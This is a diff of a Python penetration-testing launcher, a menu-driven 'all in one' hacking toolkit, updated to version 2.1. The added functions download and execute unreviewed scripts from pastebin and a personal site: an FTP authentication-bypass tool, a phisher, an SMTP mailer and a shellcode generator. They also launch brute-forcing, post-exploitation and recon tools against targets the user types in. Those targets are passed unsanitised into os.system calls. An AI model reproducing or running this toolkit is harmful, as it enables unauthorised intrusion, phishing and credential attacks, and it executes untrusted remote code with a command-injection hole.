@@ -1,8 +1,8 @@
  #!/usr/bin/env python2.7
 #
 #          All In One Tool For Penetration Testing 
-#           Authors : Fedy Wesleti , Mohamed Nour 
-#
+#           Authors : Mohamed Nour , Fedy Wesleti  
+
 import sys
 import argparse
 import os
@@ -33,35 +33,34 @@ yes = set(['yes','y', 'ye', 'Y'])
 no = set(['no','n'])
 def logo():
     print """
- ooooooooo.                         oooooooooo.                        
-`888   `Y88.                       `888'   `Y8b                       
- 888   .d88'  .ooooo.  ooo. .oo.    888     888  .ooooo.  oooo    ooo 
- 888ooo88P'  d88' `88b `888P"Y88b   888oooo888' d88' `88b  `88b..8P'  
- 888         888ooo888  888   888   888    `88b 888   888    Y888'    
- 888         888    .o  888   888   888    .88P 888   888  .o8"'88b   
-o888o        `Y8bod8P' o888o o888o o888bood8P'  `Y8bod8P' o88'   888o v1.3
-                                  A Penetration Testing Framework
-                                                                      
-                                                                      
-  [+]       Coded BY Fedy Wesleti & Mohamed Nour        [+] 
-  [+]                FB/CEH.TN   ~~ FB/mohamed.zeus.0   [+] 
-  [+]             Greetz To All Pentesters              [+] 
+  ______                 ______                
+ (_____ \               (____  \               
+  _____) )  ____  ____   ____)  )  ___   _   _ 
+ |  ____/  / _  )|  _ \ |  __  (  / _ \ ( \ / )
+ | |      ( (/ / | | | || |__)  )| |_| | ) X ( 
+ |_|       \____)|_| |_||______/  \___/ (_/ \_) V2.1
+                         A Penetration Testing Framework
+                                                                        
+
+[+]       Coded BY Mohamed Nour & Fedy Wesleti       [+] 
+[+]         FB/mohamednour.tn   ~~ FB/CEH.tN         [+] 
+[+]             Greetz To All Pentesters             [+] 
+
 """
 def menu():
     print ("""
- ooooooooo.                         oooooooooo.                        
-`888   `Y88.                       `888'   `Y8b                       
- 888   .d88'  .ooooo.  ooo. .oo.    888     888  .ooooo.  oooo    ooo 
- 888ooo88P'  d88' `88b `888P"Y88b   888oooo888' d88' `88b  `88b..8P'  
- 888         888ooo888  888   888   888    `88b 888   888    Y888'    
- 888         888    .o  888   888   888    .88P 888   888  .o8"'88b   
-o888o        `Y8bod8P' o888o o888o o888bood8P'  `Y8bod8P' o88'   888o v1.3
-                                  A Penetration Testing Framework
-                                                                      
+  ______                 ______                
+ (_____ \               (____  \               
+  _____) )  ____  ____   ____)  )  ___   _   _ 
+ |  ____/  / _  )|  _ \ |  __  (  / _ \ ( \ / )
+ | |      ( (/ / | | | || |__)  )| |_| | ) X ( 
+ |_|       \____)|_| |_||______/  \___/ (_/ \_) V2
+                         A Penetration Testing Framework
+                                                                        
 
-  [+]       Coded BY Fedy Wesleti & Mohamed Nour        [+] 
-  [+]                FB/CEH.TN   ~~ FB/mohamed.zeus.0   [+] 
-  [+]             Greetz To All Pentesters              [+] 
+[+]       Coded BY Mohamed Nour & Fedy Wesleti       [+] 
+[+]         FB/mohamednour.tn   ~~ FB/CEH.tN         [+] 
+[+]             Greetz To All Pentesters             [+] 
 
     Select from the menu:
 
@@ -73,7 +72,8 @@ o888o        `Y8bod8P' o888o o888o o888bood8P'  `Y8bod8P' o88'   888o v1.3
     6 : Web Hacking 
     7 : Private Tools
     8 : Post Exploitation
-    99 : Exit
+    9 : Recon
+    99: Exit
 
     """)
     choice = raw_input("Enter Your Choice:")
@@ -94,23 +94,67 @@ o888o        `Y8bod8P' o888o o888o o888bood8P'  `Y8bod8P' o88'   888o v1.3
         tnn()
     elif choice == "8":
         postexp()
+    elif choice == "9":
+        sniper()    
     elif choice == "99":
         clearScr(),sys.exit();
     elif choice == "":
         menu()
     else: 
         menu()
+def sniper():
+    print ("This tool is only available for Linux / OSX or similar systems ")
+    choicesniper = raw_input("Continue Y / N: ")
+    if choicesniper in yes:
+        os.system ("git clone https://github.com/1N3/Sn1per.git")
+        os.system ("cd Sn1per && sudo bash ./install.sh")
+        os.system ("sniper")
+    elif choicesniper == "":
+        menu()
+def doork():
+    print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
+    doorkchice = raw_input("Continue Y / N: ")
+    if doorkchice in yes:
+        os.system("pip install beautifulsoup4 && pip install requests")
+        os.system("git clone https://github.com/AeonDave/doork")
+        clearScr()
+        doorkt = raw_input("Target : ")
+        os.system("cd doork && python doork.py -t %s -o log.log"%doorkt)
 def postexp():
     clearScr()
-    print("1: Shell Checker")
-    print("99:Return to main menu ")
+    print("1:  Shell Checker")
+    print("2:  POET")
+    print("99: Return to main menu ")
     choice11 = raw_input("Enter Your Choice:")
     if choice11 == "1":
         sitechecker()
+    if choice11 == "2":
+        poet()
     elif choice11 == "99":
         menu()
+def brutex():
+    clearScr()
+    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
+    os.system("git clone https://github.com/1N3/BruteX.git")
+    clearScr
+    brutexchoice = raw_input("Select a Target : ")
+    os.system("cd BruteX && chmod 777 brutex && ./brutex %s"%brutexchoice)
+def xsstracer():
+    clearScr()
+    print("XSSTracer is a small python script that checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
+    os.system("git clone https://github.com/1N3/XSSTracer.git")
+    clearScr ()
+    xsstracerchoice = raw_input("Select a Target: ")
+    os.system("cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80"%xsstracerchoice)
+def gabriel():
+    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
+    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
+    clearScr()
+    os.system("python gabriel.py")
+    ftpbypass=raw_input("Enter Target IP and Use Command :")
+    os.system("python gabriel.py %s"%ftpbypass)
 def sitechecker():
-    os.system("wget http://pastebin.com/raw/Rhgs1njB --output-document=ch01.py")
+    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
     clearScr()
     os.system("python ch01.py")
 def h2ip():
@@ -124,8 +168,8 @@ def ports():
     sys.exit();
 def ifinurl():
     print""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found."""
-    print('do you have Inurlbr installed ? ')
-    cinurl = raw_input("Y / N : ")
+    print('Do You Want To Install InurlBR ? ')
+    cinurl = raw_input("Y/N: ")
     if cinurl in yes:
         inurl()
     if cinurl in no:
@@ -134,12 +178,25 @@ def ifinurl():
         menu()
     else: 
         menu()
+def venom():
+    print ("Venom Automatic Shellcode Generator")
+    print ("Do You To Install Venom ?")
+    choiceshell = raw_input("Y/N: ")
+    if choiceshell in yes:
+        os.system("wget http://fsociety.tn/venom.zip --output-document=venom.zip")
+        os.system("unzip venom.zip -d venom")
+        os.system("cd venom && sh venom.sh")
+    elif choiceshell in no:
+        os.system('clear'); info()     
 def commix():
     print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
     print ("usage : python commix.py --help")
     choicecmx = raw_input("Continue: y/n :")
     if choicecmx in yes:
         os.system("git clone https://github.com/stasinopoulos/commix.git commix")
+        os.system("cd commix")
+        os.system("python commix.py")
+        os.system("")
     elif choicecmx in no:
         os.system('clear'); info()        
 def pixiewps():
@@ -167,6 +224,7 @@ def webhack():
     print("8 : Shell and Directory Finder")
     print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
     print("10: Vbulletin 5.X remote code execution")
+    print("11: BruteX - Automatically brute force all services running on a target")
     print("99: Exit")
     choiceweb = raw_input("Enter Your Choice : ")
     if choiceweb == "1":
@@ -190,6 +248,8 @@ def webhack():
         clearScr();joomlarce()
     if choiceweb =="10":
         clearScr();vbulletinrce()
+    if choiceweb =="11":
+        clearScr();brutex()
     elif choiceweb =="99":
         menu()
     elif choiceweb == "":
@@ -327,7 +387,19 @@ def shelltarget():
     line = line.rstrip()
     grabuploadedlink(line)
     grabshell(line)
-
+def poet():
+    print("POET is a simple POst-Exploitation Tool.")
+    print("")
+    choicepoet = raw_input("y / n :")
+    if choicepoet in yes:
+        os.system("git clone https://github.com/mossberg/poet.git")
+        os.system("python poet/server.py")
+    if choicepoet in no:
+        clearScr(); postexp()
+    elif choicepoet == "":
+        menu()
+    else: 
+        menu()
 def setoolkit():
     print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
     print(") designed for social engineering. SET has a number of custom attack vectors that ")
@@ -476,6 +548,8 @@ def info():
     print("4: Host To IP")
     print("5: wordpress user enumeration")
     print("6: CMS scanner")
+    print("7: XSStracer - checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection")
+    print("8: Doork - Google Dorks Passive Vulnerability Auditor ")
     print("99: Back To Main Menu")
     choice2 = raw_input("Select from the menu:")
     if choice2 == "1":
@@ -490,6 +564,10 @@ def info():
         clearScr(); wpue()
     if choice2 == "6":
         clearScr(); cmsscan()
+    if choice2 == "7":
+        clearScr(); xsstracer()
+    if choice2 == "8":
+        clearScr();doork()
     elif choice2 =="99":
         clearScr(); menu()
     elif choice2 == "":
@@ -511,6 +589,7 @@ def priv8():
 def passwd():
     print("1: Cupp ")
     print("2: Ncrack")
+
     print("99: Back To Main Menu")
     choice3 = raw_input("Select from the menu:")
     if choice3 =="1":
@@ -541,20 +620,26 @@ def wire():
     else: 
         menu()
 def exp():
-    print("1 : jboss-autopwn ")
+    print("1 : Venom")
     print("2 : sqlmap")
     print("3 : Shellnoob")
     print("4 : commix")
+    print("5 : FTP Auto Bypass")
+    print("6 : jboss-autopwn")
     print("99 : Go Back To Main Menu")
     choice5 = raw_input("Select from the menu:")
     if choice5 =="2":
         clearScr(); sqlmap()
     if choice5 =="1":
-     os.system('clear'); jboss()
+     os.system('clear'); venom()
     if choice5 =="3":
         clearScr(); shellnoob()
     if choice5 =="4":
         os.system("clear"); commix()
+    if choice5 =="5":
+        clearScr(); gabriel()
+    if choice5 =="6":
+        clearScr(); jboss()
     elif choice5 =="99":
         menu()
     elif choice5 == "":
@@ -563,49 +648,33 @@ def exp():
         menu()
 def snif():
     print("1 : Setoolkit ")
-    print("2 : Ssltrip")
+    print("2 : SSLtrip")
+    print("3 : pyPISHER")
+    print("4 : SMTP Mailer")
     print("99: Back To Main Menu")
     choice6 = raw_input("Select from the menu:")
     if choice6 =="1":
      clearScr(); setoolkit()
     if choice6 =="2":
         clearScr(); ssls()
+    if choice6 =="3":
+        clearScr(); pisher()
+    if choice6 =="4":
+        clearScr(); smtpsend()
     if choice6 =="99":
        clearScr(); menu()
     elif choice6 == "":
         menu()
     else: 
         menu()
-def win():
+def smtpsend():
+    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
     clearScr()
-    print("Our Tool Does Not Support Windows , run it on linux or install a virtual machine ")
-    sys.exit();
-  #Check use OS
-def OS():
-    print(
-    """
-    Choose Operating System : 
-    1) Mac OSX
-    2) Linux
-    3) Windows
-    """)
-    system = raw_input("choose an OS : ")
-    if system =="2":
-        menu()
-    elif system =="1":
-        root()
-    elif system =="3":
-        win()
-    elif system == "":
-        OS()
-    else:
-        sys.exit();
-def root():
-    if os.getuid() != 0:
-        print("Are you root? Please execute as root")
-        exit() 
-    else:
-        menu()
+    os.system("python smtp.py")
+def pisher():
+    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
+    clearScr()
+    os.system("python pisher.py")
 menuu = """
  1) Get all websites
  2) Get joomla websites
@@ -1331,6 +1400,3 @@ def wpminiscanner():
 #begin :D 
 if __name__ == "__main__":
   menu()
-
-    
-  
